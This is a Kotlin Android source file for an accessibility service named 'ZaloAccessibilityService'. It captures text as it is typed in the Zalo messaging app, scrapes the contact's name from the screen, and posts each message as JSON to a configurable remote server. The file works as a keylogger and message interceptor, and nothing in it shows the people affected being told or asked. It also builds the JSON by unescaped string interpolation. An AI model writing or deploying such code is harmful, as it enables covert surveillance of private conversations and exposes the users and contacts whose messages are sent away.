package com.example.cetena1

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class ZaloAccessibilityService : AccessibilityService() {

    private var lastCapturedText: String = ""
    private val client = OkHttpClient()

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.e("ZaloTracker", "✅ DỊCH VỤ OUTBOUND ĐÃ KẾT NỐI!")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""
        
        // Log để kiểm tra tên gói Zalo thật sự trên máy bạn
        // Log.e("ZaloTracker", "Sự kiện từ: $pkg")

        if (!pkg.contains("zalo")) return

        try {
            when (event.eventType) {
                // Theo dõi gõ phím liên tục
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank() && text != "[]") {
                        lastCapturedText = text
                        Log.e("ZaloTracker", "✍️ Đang gõ: $lastCapturedText")
                    }
                }

                // Khi màn hình thay đổi (Zalo chuẩn bị gửi hoặc cập nhật UI)
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val rootNode = rootInActiveWindow ?: return
                    val currentText = findInputText(rootNode)
                    if (currentText.isNotBlank()) {
                        lastCapturedText = currentText
                    }
                }

                // Khi phát hiện bấm nút (Bất kỳ nút nào)
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    if (lastCapturedText.isNotBlank()) {
                        Log.e("ZaloTracker", "🚀 PHÁT HIỆN GỬI: $lastCapturedText")
                        val rootNode = rootInActiveWindow
                        val name = if (rootNode != null) findContactName(rootNode) else "Người dùng Zalo"
                        
                        sendToMessageCenter(name, lastCapturedText)
                        
                        // Không xóa ngay lập tức để tránh mất dữ liệu nếu nhấn nhiều lần
                        val textToSend = lastCapturedText
                        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                            if (lastCapturedText == textToSend) lastCapturedText = ""
                        }, 500)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("ZaloTracker", "⚠️ Lỗi: ${e.message}")
        }
    }

    private fun findInputText(rootNode: AccessibilityNodeInfo): String {
        val ids = arrayOf(
            "com.zing.zalo:id/chat_input_field", 
            "com.vng.zalo:id/chat_input_field", 
            "com.zing.zalo:id/input_field",
            "com.zing.zalo:id/tv_chat_input"
        )
        for (id in ids) {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
            if (nodes != null && nodes.isNotEmpty()) {
                val text = nodes[0].text?.toString() ?: ""
                nodes.forEach { it.recycle() }
                if (text.isNotBlank()) return text
            }
        }
        return ""
    }

    private fun findContactName(rootNode: AccessibilityNodeInfo): String {
        val ids = arrayOf(
            "com.zing.zalo:id/chat_title_name", 
            "com.vng.zalo:id/chat_title_name", 
            "com.zing.zalo:id/tv_header_title",
            "com.zing.zalo:id/name"
        )
        for (id in ids) {
            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
            if (nodes != null && nodes.isNotEmpty()) {
                val name = nodes[0].text?.toString() ?: ""
                nodes.forEach { it.recycle() }
                if (name.isNotBlank()) return name
            }
        }
        return "Người dùng Zalo"
    }

    private fun sendToMessageCenter(name: String, message: String) {
        val sharedPref = getSharedPreferences("CetenaPrefs", Context.MODE_PRIVATE)
        val url = sharedPref.getString("server_url", "") ?: ""
        if (url.isBlank()) return

        val json = """{"sender": "$name", "message": "$message", "platform": "ZALO", "direction": "OUTBOUND"}"""
        val body = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())

        val request = Request.Builder().url(url).post(body).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("ZaloTracker", "❌ GỬI THẤT BẠI: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                Log.e("ZaloTracker", "✅ ĐÃ GỬI OUTBOUND THÀNH CÔNG!")
                response.close()
            }
        })
    }

    override fun onInterrupt() {}
}